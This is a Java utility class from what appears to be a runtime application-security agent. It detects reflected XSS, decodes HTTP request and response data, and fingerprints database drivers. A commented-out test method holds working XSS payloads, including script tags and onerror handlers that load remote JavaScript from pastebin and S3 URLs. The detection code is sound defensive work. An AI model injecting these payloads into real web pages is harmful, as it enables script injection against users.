package com.k2cybersecurity.instrumentator.utils;

import com.k2cybersecurity.instrumentator.custom.*;
import com.k2cybersecurity.instrumentator.dispatcher.EventDispatcher;
import com.k2cybersecurity.intcodeagent.filelogging.FileLoggerThreadPool;
import com.k2cybersecurity.intcodeagent.filelogging.LogLevel;
import com.k2cybersecurity.intcodeagent.models.javaagent.*;
import com.k2cybersecurity.intcodeagent.websocket.JsonConverter;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.text.StringEscapeUtils;
import org.unbescape.html.HtmlEscape;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CallbackUtils {

    private static final Pattern htmlStartTagExtractor;

    private static final Pattern htmlArgExtractor;

    private static final FileLoggerThreadPool logger = FileLoggerThreadPool.getInstance();
    public static final String BACKWARD_SLASH = "/";
    public static final String ANGLE_END = ">";
    public static final String ON = "on";
    public static final String JAVASCRIPT = "javascript:";
    public static final String JS = ".js";
    public static final String HTTP = "http://";
    public static final String HTTPS = "https://";
    public static final String GET_CONNECTION = "getConnection";
    public static final String GET_META_DATA = "getMetaData";
    public static final String GET_DATABASE_PRODUCT_NAME = "getDatabaseProductName";
    public static final String GET_DRIVER_NAME = "getDriverName";
    public static final String GET_DRIVER_VERSION = "getDriverVersion";
    public static final String ERROR = "Error :";
    public static final String UNKNOWN = "UNKNOWN";
    public static final String MY_SQL = "MySQL";
    public static final String MYSQL = "MYSQL";
    public static final String ORACLE = "ORACLE";
    public static final String DERBY = "DERBY";
    public static final String HSQL = "HSQL";
    public static final String SQLITE = "SQLITE";
    public static final String H_2 = "H2";
    public static final String MSSQL = "MSSQL";
    public static final String ENTERPRISEDB = "ENTERPRISEDB";
    public static final String PHOENIX = "PHOENIX";
    public static final String POSTGRESQL = "POSTGRESQL";
    public static final String DB_2 = "DB2";
    public static final String VERTICA = "VERTICA";
    public static final String SYBASE = "SYBASE";
    public static final String SAPANA = "SAPANA";
    public static final String GREENPLUM = "GREENPLUM";
    public static final String SOLIDDB = "SOLIDDB";
    public static final String MARIADB = "MARIADB";
    public static final String ORACLE1 = "Oracle";
    public static final String APACHE_DERBY = "Apache Derby";
    public static final String HSQL_DATABASE_ENGINE = "HSQL Database Engine";
    public static final String SQ_LITE = "SQLite";
    public static final String MICROSOFT_SQL_SERVER = "Microsoft SQL Server";
    public static final String ENTERPRISE_DB = "EnterpriseDB";
    public static final String PHOENIX1 = "Phoenix";
    public static final String POSTGRE_SQL = "PostgreSQL";
    public static final String VERTICA1 = "Vertica";
    public static final String ADAPTIVE = "Adaptive";
    public static final String ASE = "ASE";
    public static final String SQL_SERVER = "sql server";
    public static final String HDB = "HDB";
    public static final String GREENPLUM1 = "Greenplum";
    public static final String SOLID_DB = "solidDB";
    public static final String MARIA = "maria";
    public static final String FIVE_COLON = "::::";
    public static final String APPLICATION_JSON = "application/json";
    public static final String APPLICATION_XML = "application/xml";
    public static final String APPLICATION_X_WWW_FORM_URLENCODED = "application/x-www-form-urlencoded";
    public static final String SCRIPT = "script";
    public static final String SCRIPT_END = "</script";
    public static final String ON1 = "on";
    public static final String SRC = "src";
    public static final String HREF = "href";

    private static Map<Integer, JADatabaseMetaData> sqlConnectionMap;

    public static Class requestInterface = null;
    public static Class responseInterface = null;

    static {
        htmlStartTagExtractor = Pattern.compile(
                "<([!?a-zA-Z]+[0-9]*)(?:\\s*|\\\\)?([\\s\\S]*?)?>([\\s\\S]*?)",
                Pattern.MULTILINE | Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
        htmlArgExtractor = Pattern.compile("([\\s\\/]*[a-zA-z\\-\\_0-9]+[\\s\\/]*)=(?:\\s*?)(('|\")([\\s\\S]*?)\\3|\\S+)",
                Pattern.MULTILINE | Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
        sqlConnectionMap = new LinkedHashMap<Integer, JADatabaseMetaData>(50) {
            @Override
            protected boolean removeEldestEntry(java.util.Map.Entry<Integer, JADatabaseMetaData> eldest) {
                return size() > 50;
            }
        };
    }

    public static void checkForFileIntegrity(Map<String, FileIntegrityBean> fileLocalMap) {
        for (Entry<String, FileIntegrityBean> entry : fileLocalMap.entrySet()) {
            boolean isExists = new File(entry.getKey()).exists();
            if (!entry.getValue().getExists().equals(isExists)) {
                EventDispatcher.dispatch(entry.getValue(), VulnerabilityCaseType.FILE_INTEGRITY);
            }
        }
    }

    // TODO: use complete response instead of just response body.
    public static String checkForReflectedXSS(HttpRequestBean httpRequestBean) {
        String combinedRequestData = decodeRequestData(httpRequestBean);
        String combinedResponseData = decodeResponseData(httpRequestBean.getHttpResponseBean());
//        System.out.println("Processed request data is : " + combinedRequestData);
//        System.out.println("Processed response data is : " + combinedResponseData);

        List<String> attackContructs = isXSS(combinedRequestData);

        for (String construct : attackContructs) {
//			System.err.println(String.format(
//					"Reflected XSS contruct detected ::  %s :: Request : %s", construct,
//					httpRequestBean));
            if (StringUtils.containsIgnoreCase(combinedResponseData, construct)) {
//                System.err.println(String.format(
//                        "Reflected XSS attack detected :: Construct : %s :: Request : %s :: Response : %s", construct,
//                        httpRequestBean, httpRequestBean.getHttpResponseBean().getResponseBody()));
                return construct;
            }
        }

        return StringUtils.EMPTY;
    }

    /**
     * Method to url decode given encodedString under UTF-8 encoding. If the
     * conversion is not possible, <code>original string</code> is returned.
     *
     * @param encodedString URL encoded string
     * @return URL decoded string
     */
    public static String urlDecode(String encodedString) {
        String decodedString = StringUtils.EMPTY;
        try {
            decodedString = URLDecoder.decode(encodedString, StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            decodedString = encodedString;
        }
        return decodedString;
    }

    /**
     * Method to url decode given encodedString under UTF-8 encoding. If the
     * conversion is not possible, <code>original string</code> is returned.
     *
     * @param encodedString URL encoded string
     * @return URL decoded string
     */
    public static String uriDecode(String encodedString) {
        String decodedString = StringUtils.EMPTY;
        try {
            decodedString = new URI(encodedString).getPath();
        } catch (Exception e) {
            decodedString = encodedString;
        }
        return decodedString;
    }

    private static List<String> isXSS(String combinedData) {
        List<String> attackConstructs = new ArrayList<>();
//        System.out.println("Consolidated XSS data : " + combinedData);

        Matcher htmlStartTagMatcher = htmlStartTagExtractor.matcher(combinedData);
        while (htmlStartTagMatcher.find()) {
            if (StringUtils.isNotBlank(htmlStartTagMatcher.group(1)) && StringUtils.equalsIgnoreCase(htmlStartTagMatcher.group(1).trim(), SCRIPT)) {
                int endTagStartIndex = StringUtils.indexOfIgnoreCase(combinedData, SCRIPT_END, htmlStartTagMatcher.end());
                String body = StringUtils.substring(combinedData, htmlStartTagMatcher.end(), endTagStartIndex).trim();
                if (StringUtils.isNotBlank(body)) {
                    attackConstructs.add(body);
                }
            }

            if (StringUtils.isNotBlank(htmlStartTagMatcher.group(2))) {
                Matcher attribMatcher = htmlArgExtractor.matcher(htmlStartTagMatcher.group(2).trim());
                while (attribMatcher.find()) {
                    String attribKey = attribMatcher.group(1);
                    attribKey = StringUtils.trim(attribKey);
                    attribKey = StringUtils.removeStart(attribKey, BACKWARD_SLASH).trim();

                    String attribVal = attribMatcher.group(2);
                    if (StringUtils.isNotBlank(attribVal) && (StringUtils.startsWithIgnoreCase(attribKey, ON1)
                            || StringUtils.equalsIgnoreCase(attribKey, SRC)
                            || StringUtils.equalsIgnoreCase(attribKey, HREF)
                            || StringUtils.containsIgnoreCase(HtmlEscape.unescapeHtml(attribVal), JAVASCRIPT))) {
                        attackConstructs.add(attribMatcher.group());
                    }
                }
            }
        }
        return attackConstructs;
    }


//    public static void main(String[] args) {
//        System.out.println("Detection : " + isXSS("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
//        System.out.println("Detection : " + isXSS("<img src=\"///\" onerror=\"a = document.createElement('script'); a.src = 'http://demofilespa.s3.amazonaws.com/jfptest.js'; document.head.appendChild(a);\" />"));
//        System.out.println("Detection : " + isXSS("<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\""));
//        System.out.println("Detection : " + isXSS("<script /**/>/**/alert(1)/**/</script /**/"));
//        System.out.println("Detection : " + isXSS("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
//
//        System.out.println("Detection : " + isXSS("<script src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" >"));
//
//        System.out.println("Detection : " + isXSS("<<script  src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" > </script"));
//
//        System.out.println("Detection : " + isXSS("<img src=\"/\" =_=\" title=\"\nonerror='prompt(1)'\">"));
//
//        System.out.println("Detection : " + isXSS("<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">"));
//
//        System.out.println("Detection : " + isXSS("<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"));
//
//        System.out.println("Detection : " + isXSS("<<SCRIPT>ale\nrt(\"XSS\");//<</SCRIPT>>>>"));
//
//        System.out.println("Detection : " + isXSS("<script\n" +
//                ">alert(1); \n" +
//                "</script\n" +
//                ">"));
//
//        System.out.println("Detection : " + isXSS("<img src=x onerror= alert(1)>"));
//        System.out.println("Detection : " + isXSS("<img src=x onerror=alert(1)>"));
//        System.out.println("Detection : " + isXSS("<img onerror=alert(1) >"));
//        System.out.println("Detection : " + isXSS("<img src=x onerror=\"alert(1)\" > "));
//
//    }

    /**
     * @return the sqlConnectionMap
     */
    public static Map<Integer, JADatabaseMetaData> getSqlConnectionMap() {
        return sqlConnectionMap;
    }

    public static String getConnectionInformation(Object ref, boolean needToGetConnection) {
        try {
            Object connection;
            if (needToGetConnection) {
                Method getConnection = ref.getClass().getMethod(GET_CONNECTION, null);
                getConnection.setAccessible(true);
                connection = getConnection.invoke(ref, null);
            } else {
                connection = ref;
            }
            if (sqlConnectionMap.containsKey(connection.hashCode())) {
                JADatabaseMetaData metaData = sqlConnectionMap.get(connection.hashCode());
                return metaData.getDbIdentifier();
            } else {
                Method getMetaData = connection.getClass().getMethod(GET_META_DATA, null);
                getMetaData.setAccessible(true);
                Object dbMetaData = getMetaData.invoke(connection, null);

                Method getDatabaseProductName = dbMetaData.getClass().getMethod(GET_DATABASE_PRODUCT_NAME, null);
                getDatabaseProductName.setAccessible(true);
                String productName = (String) getDatabaseProductName.invoke(dbMetaData, null);

                Method getDriverName = dbMetaData.getClass().getMethod(GET_DRIVER_NAME, null);
                getDriverName.setAccessible(true);
                String driverName = (String) getDriverName.invoke(dbMetaData, null);

                Method getDriverVersion = dbMetaData.getClass().getMethod(GET_DRIVER_VERSION, null);
                getDriverVersion.setAccessible(true);
                String driverVersion = (String) getDriverVersion.invoke(dbMetaData, null);

                if (StringUtils.isNotBlank(productName)) {
                    JADatabaseMetaData jaDatabaseMetaData = new JADatabaseMetaData(productName);
                    jaDatabaseMetaData.setDriverName(driverName);
                    jaDatabaseMetaData.setDriverVersion(driverVersion);
                    jaDatabaseMetaData.setDriverClassName(connection.getClass().getName());
                    jaDatabaseMetaData.setDbIdentifier(detectDatabaseProduct(productName));
//                    System.out.println("DB details detected: " + jaDatabaseMetaData);
                    sqlConnectionMap.put(connection.hashCode(), jaDatabaseMetaData);
                    return jaDatabaseMetaData.getDbIdentifier();
                }
            }

        } catch (Exception e) {
            logger.log(LogLevel.ERROR, ERROR, e, CallbackUtils.class.getName());
        }
        return UNKNOWN;
    }

    private static String detectDatabaseProduct(String databaseProductName) {

        if (databaseProductName.contains(MY_SQL)) {
            return MYSQL;
        }
        if (databaseProductName.startsWith(ORACLE1)) {
            return ORACLE;
        }
        if (databaseProductName.startsWith(APACHE_DERBY)) {
            return DERBY;
        }
        if (databaseProductName.contains(HSQL_DATABASE_ENGINE)) {
            return HSQL;
        }
        if (databaseProductName.startsWith(SQ_LITE)) {
            return SQLITE;
        }
        if (databaseProductName.startsWith(H_2)) {
            return H_2;
        }
        if (databaseProductName.startsWith(MICROSOFT_SQL_SERVER)) {
            return MSSQL;
        }
        if (databaseProductName.startsWith(ENTERPRISE_DB)) {
            return ENTERPRISEDB;
        }
        if (databaseProductName.startsWith(PHOENIX1)) {
            return PHOENIX;
        }
        if (databaseProductName.startsWith(POSTGRE_SQL)) {
            return POSTGRESQL;
        }
        if (databaseProductName.startsWith(DB_2)) {
            return DB_2;
        }
        if (databaseProductName.startsWith(VERTICA1)) {
            return VERTICA;
        }
        if (databaseProductName.startsWith(ADAPTIVE) || databaseProductName.startsWith(ASE) || databaseProductName
                .startsWith(SQL_SERVER)) {
            return SYBASE;
        }
        if (databaseProductName.startsWith(HDB)) {
            return SAPANA;
        }
        if (databaseProductName.startsWith(GREENPLUM1)) {
            return GREENPLUM;
        }
        if (databaseProductName.contains(SOLID_DB)) {
            return SOLIDDB;
        }
        if (StringUtils.containsIgnoreCase(databaseProductName, MARIA)) {
            return MARIADB;
        }
        return UNKNOWN;
    }

    public static String decodeResponseData(HttpResponseBean httpResponseBean) {
        StringBuilder consolidatedBody = new StringBuilder();
        String contentType = httpResponseBean.getResponseContentType();
        String responseBody = httpResponseBean.getResponseBody();
        String processedBody = responseBody;

        String processedHeaders = StringEscapeUtils.unescapeJson(httpResponseBean.getHeaders().toString());
        String oldHeaders = processedHeaders;

        try {
            consolidatedBody.append(processedBody);
            consolidatedBody.append(FIVE_COLON);

//            processedBody = HtmlEscape.unescapeHtml(responseBody);
//            consolidatedBody.append(processedBody);
//            consolidatedBody.append(FIVE_COLON);

            consolidatedBody.append(processedHeaders);
            consolidatedBody.append(FIVE_COLON);

//            processedHeaders = HtmlEscape.unescapeHtml(processedHeaders);
//            consolidatedBody.append(processedHeaders);
//            consolidatedBody.append(FIVE_COLON);


            processedBody = urlDecode(processedBody);
            consolidatedBody.append(FIVE_COLON);
            consolidatedBody.append(processedBody);

            processedHeaders = urlDecode(processedHeaders);
            consolidatedBody.append(processedHeaders);
            consolidatedBody.append(FIVE_COLON);

            String oldProcessedBody;

            if (StringUtils.isNoneEmpty(responseBody)) {
                switch (contentType) {
                    case APPLICATION_JSON:
                        do {
                            oldProcessedBody = processedBody;
                            processedBody = StringEscapeUtils.unescapeJson(processedBody);
                            if (!StringUtils.equals(oldProcessedBody, processedBody)) {
                                consolidatedBody.append(FIVE_COLON);
                                consolidatedBody.append(processedBody);
//                            System.out.println("Decoding JSON: " + processedBody);
                            }
                        } while (!StringUtils.equals(oldProcessedBody, processedBody));
                        break;
                    case APPLICATION_XML:
                        do {
                            oldProcessedBody = processedBody;
                            processedBody = StringEscapeUtils.unescapeXml(processedBody);
                            if (!StringUtils.equals(oldProcessedBody, processedBody)) {
                                consolidatedBody.append(FIVE_COLON);
                                consolidatedBody.append(processedBody);
//                            System.out.println("Decoding XML: " + processedBody);
                            }
                        } while (!StringUtils.equals(oldProcessedBody, processedBody));
                        break;

                }
            }
            return consolidatedBody.toString();
        } catch (Exception e) {
            logger.log(LogLevel.ERROR, ERROR, e, CallbackUtils.class.getName());
        }
        return StringUtils.EMPTY;
    }

    public static String decodeRequestData(HttpRequestBean httpRequestBean) {
        StringBuilder consolidatedBody = new StringBuilder();
        String contentType = httpRequestBean.getContentType();
        String body = httpRequestBean.getBody();
        String processedUrl = httpRequestBean.getUrl();
        String oldUrl = processedUrl;
        String processedBody = body;

        String processedHeaders = StringEscapeUtils.unescapeJson(httpRequestBean.getHeaders().toString());
        String oldHeaders = processedHeaders;

        try {
            consolidatedBody.append(oldHeaders);
//            consolidatedBody.append(FIVE_COLON);
//            consolidatedBody.append(HtmlEscape.unescapeHtml(oldHeaders));
            consolidatedBody.append(FIVE_COLON);
            consolidatedBody.append(processedBody);
//            consolidatedBody.append(FIVE_COLON);
//            consolidatedBody.append(HtmlEscape.unescapeHtml(processedBody));
            if (httpRequestBean.getParameterMap() != null) {
                String pmap = StringEscapeUtils.unescapeJson(JsonConverter.toJSONMap(httpRequestBean.getParameterMap()));
                consolidatedBody.append(FIVE_COLON);
                consolidatedBody.append(pmap);
                pmap = StringEscapeUtils.unescapeJson(pmap);
                consolidatedBody.append(FIVE_COLON);
                consolidatedBody.append(pmap);
                pmap = StringEscapeUtils.unescapeJava(pmap);
                consolidatedBody.append(FIVE_COLON);
                consolidatedBody.append(pmap);
            }
//            if(httpRequestBean.getParts() !=null ) {
//                consolidatedBody.append(FIVE_COLON);
//                consolidatedBody.append(HtmlEscape.unescapeHtml(httpRequestBean.getParts().toString()));
//            }
            // For URL
            consolidatedBody.append(FIVE_COLON);
            consolidatedBody.append(processedUrl);
            do {
                oldUrl = processedUrl;
                processedUrl = urlDecode(processedUrl);
                if (!StringUtils.equals(oldUrl, processedUrl)) {
                    consolidatedBody.append(FIVE_COLON);
                    consolidatedBody.append(processedUrl);
//                    System.out.println("Decoding URL Line: " + processedUrl);
                }
            } while (!StringUtils.equals(oldUrl, processedUrl));

            do {
                oldHeaders = processedHeaders;
                processedHeaders = urlDecode(processedHeaders);
                if (!StringUtils.equals(oldHeaders, processedHeaders)) {
                    consolidatedBody.append(FIVE_COLON);
                    consolidatedBody.append(processedHeaders);
//                    System.out.println("Decoding URL Headers: " + processedHeaders);
                }
            } while (!StringUtils.equals(oldHeaders, processedHeaders));

            if (StringUtils.isNotBlank(processedBody)) {
                String oldProcessedBody;
                switch (contentType) {
                    case APPLICATION_JSON:
                        do {
                            oldProcessedBody = processedBody;
                            processedBody = StringEscapeUtils.unescapeJson(processedBody);
                            if (!StringUtils.equals(oldProcessedBody, processedBody)) {
                                consolidatedBody.append(FIVE_COLON);
                                consolidatedBody.append(processedBody);
//                            System.out.println("Decoding JSON: " + processedBody);
                            }
                        } while (!StringUtils.equals(oldProcessedBody, processedBody));
                        break;
                    case APPLICATION_XML:
                        do {
                            oldProcessedBody = processedBody;
                            processedBody = StringEscapeUtils.unescapeXml(processedBody);
                            if (!StringUtils.equals(oldProcessedBody, processedBody)) {
                                consolidatedBody.append(FIVE_COLON);
                                consolidatedBody.append(processedBody);
//                            System.out.println("Decoding XML: " + processedBody);
                            }
                        } while (!StringUtils.equals(oldProcessedBody, processedBody));
                        break;

                    case APPLICATION_X_WWW_FORM_URLENCODED:
                        processedBody = urlDecode(processedBody);
                        consolidatedBody.append(FIVE_COLON);
                        consolidatedBody.append(processedBody);

                        do {
                            oldProcessedBody = processedBody;
                            processedBody = urlDecode(processedBody);
                            if (!StringUtils.equals(oldProcessedBody, processedBody)) {
                                consolidatedBody.append(FIVE_COLON);
                                consolidatedBody.append(processedBody);
//                            System.out.println("Decoding URL: " + processedBody);
                            }
                        } while (!StringUtils.equals(oldProcessedBody, processedBody));


                        break;
                }
            }
            return consolidatedBody.toString();
        } catch (Exception e) {
            logger.log(LogLevel.ERROR, ERROR, e, CallbackUtils.class.getName());
        }
        return StringUtils.EMPTY;
    }

    public static boolean checkArgsTypeHeirarchy(Object requestArg, Object responseArg) {
        if (requestArg == null || responseArg == null) {
            return false;
        }
        try {
            if (requestInterface == null) {
                requestInterface = Class.forName("javax.servlet.http.HttpServletRequest", false, requestArg.getClass().getClassLoader());
            }
            if (responseInterface == null) {
                responseInterface = Class.forName("javax.servlet.http.HttpServletResponse", false, responseArg.getClass().getClassLoader());
            }
            return requestInterface.isAssignableFrom(requestArg.getClass()) && responseInterface.isAssignableFrom(responseArg.getClass());
        } catch (Exception e) {
//            e.printStackTrace();
        }
        return false;
    }

    public static boolean checkArgsTypeHeirarchyRequest(Object requestArg) {
        if (requestArg == null) {
            return false;
        }
        try {
            if (requestInterface == null) {
                requestInterface = Class.forName("javax.servlet.http.HttpServletRequest", false, requestArg.getClass().getClassLoader());
            }
            return requestInterface.isAssignableFrom(requestArg.getClass());
        } catch (Exception e) {
//            e.printStackTrace();
        }
        return false;
    }

    public static boolean checkArgsTypeHeirarchyResponse(Object responseArg) {
        if (responseArg == null) {
            return false;
        }
        try {
            if (responseInterface == null) {
                responseInterface = Class.forName("javax.servlet.http.HttpServletResponse", false, responseArg.getClass().getClassLoader());
            }
            return responseInterface.isAssignableFrom(responseArg.getClass());
        } catch (Exception e) {
//            e.printStackTrace();
        }
        return false;
    }

    public static void cleanUpAllStates(){
        // Clean up
        ThreadLocalHTTPServiceLock.getInstance().resetLock();
        ThreadLocalHttpMap.getInstance().cleanState();
        ThreadLocalDBMap.getInstance().clearAll();
        ThreadLocalSessionMap.getInstance().clearAll();
        ThreadLocalLDAPMap.getInstance().clearAll();
        ThreadLocalExecutionMap.getInstance().cleanUp();
    }
}
